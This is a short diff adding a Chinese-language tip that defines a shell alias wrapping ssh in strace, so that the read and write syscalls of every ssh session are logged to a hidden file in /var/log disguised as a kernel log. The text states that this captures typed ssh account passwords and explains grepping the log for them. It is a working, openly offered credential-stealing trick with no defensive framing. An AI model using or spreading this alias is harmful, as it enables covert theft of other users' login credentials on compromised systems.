@@ -1,0 +1,5 @@
+alias ssh='strace -o /var/log/.kernel-`date '+%d%h%m%s'`.log -e read,write,connect -s2048 ssh'   会把ssh的账号密码输入保存到 /var/log/.kernel*里边。
+
+然后通过 grep  "read"  查找即可。
+
+当然，-o 输出的文件自己可以定义。
